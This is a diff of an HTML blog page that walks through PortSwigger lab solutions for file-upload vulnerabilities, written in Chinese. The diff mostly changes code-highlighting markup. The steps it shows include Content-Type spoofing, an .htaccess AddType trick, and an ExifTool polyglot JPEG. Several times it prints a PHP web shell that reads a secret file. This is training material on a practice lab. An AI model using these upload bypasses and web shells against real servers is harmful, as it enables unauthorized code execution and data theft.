@@ -70,10 +70,6 @@
   
 
   
-    
-<link rel="stylesheet" href="https://gcore.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/styles/atom-one-dark.min.css">
-
-  
 
   <link
   rel="stylesheet"
@@ -81,7 +77,8 @@
   media="all"
 />
 
-</head><body>
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head><body>
 
 
 
@@ -137,7 +134,7 @@
 <p>登录用户，选择一个图片上传。用 burp 分别拦截“<u><em>上传文件</em></u>”和“<em><u>查看文件</u></em>”的数据包，一个 POST 请求，另一个是 GET 请求</p>
 <p>在 burp <u><em>上传文件</em></u>中文件名后缀改为<code>.php</code>，删除原来图片的内容，替换为 php webshell，并且上传</p>
 <p>在*<u>查看文件</u>*数据包中，访问上传的 webshell；或者回到浏览器，先刷新页面，后右键图片在新标签页打开</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># PHP 的读取代码</span><br><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;/home/carlos/secret&#x27;</span>); <span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment"># file_get_contents() 把整个文件读入一个字符串中。</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># PHP 的读取代码</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/home/carlos/secret&#x27;</span>); <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># file_get_contents() 把整个文件读入一个字符串中。</span></span><br></pre></td></tr></table></figure>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Portswigger%20%E9%9D%B6%E5%9C%BA%E4%B9%8B%E2%80%9C%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/202410062128823.png" alt="230216PM08_11"></p>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Portswigger%20%E9%9D%B6%E5%9C%BA%E4%B9%8B%E2%80%9C%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/202410062128209.png" alt="230216PM08_12"></p>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Portswigger%20%E9%9D%B6%E5%9C%BA%E4%B9%8B%E2%80%9C%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/202410062128918.png" alt="230216PM08_13"></p>
@@ -149,7 +146,7 @@
 <p>先登录，上传图片，在 burp 的 http history 中拦截“<u><em>上传文件</em></u>”和“<em><u>查看文件</u></em>”的数据包，并转发到 Repeater，重命名为<code>Upload File</code> <code>Show File</code>以便更好地观察</p>
 <p>在 burp <u><em>上传文件</em></u>中，修改名称、删除图片内容替换为 php webshell，最重要的一点是<u><em><strong>将<code>Content-Type</code> 修改为<code>image/jpeg</code></strong></em></u></p>
 <p>后续步骤如法炮制而来</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php <span class="hljs-built_in">echo</span> file_get_contents(<span class="hljs-string">&#x27;/home/carlos/secret&#x27;</span>); ?&gt;<br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php <span class="built_in">echo</span> file_get_contents(<span class="string">&#x27;/home/carlos/secret&#x27;</span>); ?&gt;</span><br></pre></td></tr></table></figure>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Portswigger%20%E9%9D%B6%E5%9C%BA%E4%B9%8B%E2%80%9C%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/202410062128959.png" alt="230216PM10_15"></p>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Portswigger%20%E9%9D%B6%E5%9C%BA%E4%B9%8B%E2%80%9C%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/202410062128894.png" alt="230216PM10_16"></p>
 <h2 id="3-Web-shell-upload-via-path-traversal">3. Web shell upload via path traversal</h2>
@@ -168,10 +165,10 @@
 <p><code>.htaccess</code>文件是 Apache 服务器的一个配置文件，负责相关目录下的网页配置。能够实现*<u><strong>改变文件扩展名、允许/阻止特定的用户或者目录的访问</strong></u>*</p>
 <p>可以欺骗 Apache 服务器将任意*<u><strong>自定义文件扩展名</strong></u>*映射到可执行的 MIME 类型。</p>
 <p>第一步、修改<code>.htaccess</code>文件</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 修改名称 </span><br>.htaccess<br><br><span class="hljs-comment"># 修改 Content-Type</span><br>text/plain<br><br><span class="hljs-comment"># 修改内容</span><br>AddType application/x-httpd-php .shell<br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 修改名称 </span></span><br><span class="line">.htaccess</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改 Content-Type</span></span><br><span class="line">text/plain</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改内容</span></span><br><span class="line">AddType application/x-httpd-php .shell</span><br></pre></td></tr></table></figure>
 <p>实现的功能就是：所有上传的<code>.shell</code>文件都会被当作<code>php</code>文件执行</p>
 <p>接着上传一个后缀名为<code>shell</code>的文件，完成实验室任务</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 修改名称 </span><br>code.shell<br><br><span class="hljs-comment"># 修改 Content-Type</span><br>image、png<br><br><span class="hljs-comment"># 修改内容</span><br>&lt;?php <span class="hljs-built_in">echo</span> file_get_contents(<span class="hljs-string">&#x27;/home/carlos/secret&#x27;</span>); ?&gt;<br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 修改名称 </span></span><br><span class="line">code.shell</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改 Content-Type</span></span><br><span class="line">image、png</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改内容</span></span><br><span class="line">&lt;?php <span class="built_in">echo</span> file_get_contents(<span class="string">&#x27;/home/carlos/secret&#x27;</span>); ?&gt;</span><br></pre></td></tr></table></figure>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Portswigger%20%E9%9D%B6%E5%9C%BA%E4%B9%8B%E2%80%9C%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/202410062128959.png" alt="230217AM10_23"></p>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Portswigger%20%E9%9D%B6%E5%9C%BA%E4%B9%8B%E2%80%9C%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/202410062128746.png" alt="230217AM10_24"></p>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Portswigger%20%E9%9D%B6%E5%9C%BA%E4%B9%8B%E2%80%9C%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/202410062128358.png" alt="230217AM10_25"></p>
@@ -194,9 +191,9 @@
 </blockquote>
 <p>服务器可能通过图像的字节序列来判断是否是<code>jpeg、png</code>文件等；使用 ExifTool 创建包含元数据中恶意代码的多语言 JPEG 文件</p>
 <p>在 kali 中安装 ExifTool</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">apt install libimage-exiftool-perl<br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install libimage-exiftool-perl</span><br></pre></td></tr></table></figure>
 <p>利用 ExifTool</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">exiftool -Comment=<span class="hljs-string">&quot;&lt;?php echo &#x27;START &#x27; . file_get_contents(&#x27;/home/carlos/secret&#x27;) . &#x27; END&#x27;; ?&gt;&quot;</span> code.jpg -o code.php<br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exiftool -Comment=<span class="string">&quot;&lt;?php echo &#x27;START &#x27; . file_get_contents(&#x27;/home/carlos/secret&#x27;) . &#x27; END&#x27;; ?&gt;&quot;</span> code.jpg -o code.php</span><br></pre></td></tr></table></figure>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Portswigger%20%E9%9D%B6%E5%9C%BA%E4%B9%8B%E2%80%9C%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/202410062129225.png" alt="230217PM06_34"></p>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Portswigger%20%E9%9D%B6%E5%9C%BA%E4%B9%8B%E2%80%9C%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/202410062129783.png" alt="230217PM06_35"></p>
 <h2 id="7-Web-shell-upload-via-race-condition">7. Web shell upload via race condition</h2>
@@ -705,28 +702,16 @@
     }
   });
 </script>
-<script>
-  document.addEventListener('DOMContentLoaded', function () {
-    window.codeElements = document.querySelectorAll('.code');
-    if (window.codeElements.length > 0) {
-      ctx.copycode = {
-        default_text: `Copy`,
-        success_text: `Copied`,
-        toast: ``,
-      };
-      utils.js('/js/plugins/copycode.js');
-    }
-  });
-</script>
+
 
 
                   <!-- inject -->
                   
 
-                    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.3.1/highlight.min.js"></script>
+                    <!-- <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.3.1/highlight.min.js"></script>
                     <script>
                       hljs.highlightAll();  // 这段代码会自动找到页面中所有的代码块并进行高亮
-                    </script><script src="/js/plugins/copycode.js"></script>
+                    </script> --><script src="/js/plugins/copycode.js"></script>
     <script type="text/javascript" 
       color="220,220,220" 
       opacity="0.7" 
